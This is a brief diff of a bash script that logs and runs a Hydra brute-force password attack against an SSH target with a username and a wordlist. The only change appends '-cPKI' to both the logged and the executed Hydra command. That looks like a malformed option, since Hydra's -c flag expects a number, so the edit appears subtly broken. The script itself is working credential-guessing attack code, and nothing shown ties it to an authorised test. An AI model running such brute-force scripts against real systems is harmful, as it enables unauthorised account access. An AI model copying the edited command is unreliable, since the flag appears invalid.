@@ -66,13 +66,13 @@ echo "  - Delay factor: $DELAY" | tee -a "$LOG_FILE"
 
 # Run Hydra with output redirection
 echo "[$(timestamp)] Running Hydra..." | tee -a "$LOG_FILE"
-echo "Command: hydra -l $USERNAME -P $WORDLIST ssh://$TARGET -t $TASKS -e nsr -V" | tee -a "$LOG_FILE"
+echo "Command: hydra -l $USERNAME -P $WORDLIST ssh://$TARGET -t $TASKS -e nsr -V -cPKI" | tee -a "$LOG_FILE"
 
 # Execute attack (with timing)
 START_TIME=$(date +%s)
 
 # Run Hydra attack with output logging
-hydra -l "$USERNAME" -P "$WORDLIST" "ssh://$TARGET" -t "$TASKS" -e nsr -V 2>&1 | tee -a "$LOG_FILE" || {
+hydra -l "$USERNAME" -P "$WORDLIST" "ssh://$TARGET" -t "$TASKS" -e nsr -V -cPKI 2>&1 | tee -a "$LOG_FILE" || {
   echo "[$(timestamp)] Hydra failed with error code $?" | tee -a "$LOG_FILE"
 }
 
